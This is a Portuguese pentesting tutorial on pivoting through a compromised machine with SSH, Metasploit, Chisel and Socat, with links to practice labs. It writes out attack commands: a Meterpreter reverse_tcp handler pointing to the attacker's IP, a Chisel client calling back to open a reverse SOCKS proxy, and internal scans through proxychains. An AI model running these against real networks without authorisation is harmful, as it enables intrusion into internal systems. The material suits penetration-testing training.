
### Pivoting

O Pivoting (tamb√©m chamado de port forwarding ou tunneling) √© uma t√©cnica usada em p√≥s-explora√ß√£o para acessar redes internas protegidas. Essa estrat√©gia permite que um atacante utilize uma m√°quina comprometida como ponto de salto (pivot) para alcan√ßar sistemas que normalmente n√£o estariam acess√≠veis externamente.

---

### Objetivo do Pivoting

- Acessar redes internas que n√£o s√£o diretamente expostas √† internet.-

- Explorar sistemas dentro da rede interna sem necessidade de acesso f√≠sico.

- Criar t√∫neis seguros para desviar o tr√°fego de rede.

---

### Tipos de Pivoting

### 1. Pivoting com SSH (Dynamic Port Forwarding)

O SSH Tunneling pode ser usado para redirecionar tr√°fego de uma m√°quina atacante para a rede interna via uma m√°quina comprometida.

- Criando um t√∫nel SSH para redirecionar tr√°fego:

    ~~~bash
    ssh -D 9050 -N -f usuario@maquina_pivot
    ~~~

    - `-D 9050`: Cria um proxy SOCKS na porta 9050.
    
    - `-N`: N√£o abre um shell interativo.
    
    - `-f`: Envia o processo para o background.

- Usar o t√∫nel como proxy SOCKS com proxychains:

    -  Configurar `/etc/proxychains.conf` para usar `socks5 127.0.0.1 9050`

    - Executar comandos via proxy:

        ~~~bach
        proxychains nmap -sT -Pn -p 22 192.168.1.100
        ~~~

### 2. Pivoting com Metasploit

O Metasploit permite fazer pivoting usando a funcionalidade de port forwarding.

- Criar uma sess√£o Meterpreter na m√°quina pivot:

~~~bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <IP-DO-ATACANTE>
set LPORT 4444
exploit
~~~

- Criar um t√∫nel para acessar a rede interna:

~~~bash
meterpreter > run autoroute -s 192.168.1.0/24
~~~

- Executar um scan na rede interna usando Metasploit:

~~~bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,445
exploit
~~~

### 3. Pivoting com Chisel (Port Forwarding)

O Chisel √© uma ferramenta leve para cria√ß√£o de t√∫neis TCP/UDP via HTTP, √∫til quando o SSH ou Metasploit n√£o podem ser usados.

- Baixar e executar Chisel na m√°quina atacante:

~~~bash
./chisel server --port 8000 --reverse
~~~

- Na m√°quina comprometida (cliente):

~~~bash
./chisel client <IP-DO-ATACANTE>:8000 R:1080:socks
~~~

- Usar o proxy SOCKS criado para acessar a rede interna:

~~~bash
proxychains nmap -sT -Pn -p 22 192.168.1.100
~~~

### 4. Pivoting com Socat

O Socat permite criar t√∫neis TCP para acessar portas em redes internas.

- Criar um redirecionamento na m√°quina pivot:

~~~bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:22
~~~

*Isso faz um port forwarding da porta 22 da m√°quina-alvo para a porta 8080 do atacante.*

- Acessar o servi√ßo via SSH:

~~~bash
ssh -p 8080 usuario@localhost
~~~

---

### Conclus√£o

O Pivoting √© essencial para avan√ßar em redes internas protegidas e explorar sistemas que n√£o est√£o diretamente acess√≠veis. Com t√©cnicas como SSH Tunneling, Metasploit, Chisel e Socat, √© poss√≠vel criar t√∫neis e desviar tr√°fego de rede para ganhar controle total sobre um ambiente comprometido.

### Laborat√≥rios Online

Se voc√™ quer praticar sem configurar um ambiente do zero, h√° plataformas que oferecem desafios realistas:

üîπ TryHackMe - [tryhackme.com](https://tryhackme.com/)

- Possui laborat√≥rios espec√≠ficos para pivoting, tunneling, e red teaming.
  - Algumas salas recomendadas:
    - "Pivoting" ‚Äì Explica o conceito e ensina t√©cnicas pr√°ticas.
    - "Offensive Security" ‚Äì Cobre SSH Tunneling e pivoting com Metasploit.
    - "Red Teaming Fundamentals" ‚Äì Ensina t√©cnicas avan√ßadas para acesso interno.


üîπ Hack The Box - [hackthebox.com](https://www.hackthebox.com/)

- Oferece m√°quinas virtuais para invadir e pivotar entre redes internas.
    - Algumas m√°quinas recomendadas:
      - "Jeeves" ‚Äì Exemplo de pivoting via SOCKS5.
      - "Active" ‚Äì Explora√ß√£o de redes internas usando proxychains.
      - "Access" ‚Äì Foca em port forwarding com SSH e Netcat.


üîπ Skill Dive - [INE - ine.com/dive](https://ine.com/dive)

- Laborat√≥rios interativos que permitem testar pivoting sem necessidade de configurar um ambiente local. Antigo AttackDefense, agora integrado √† plataforma INE.

---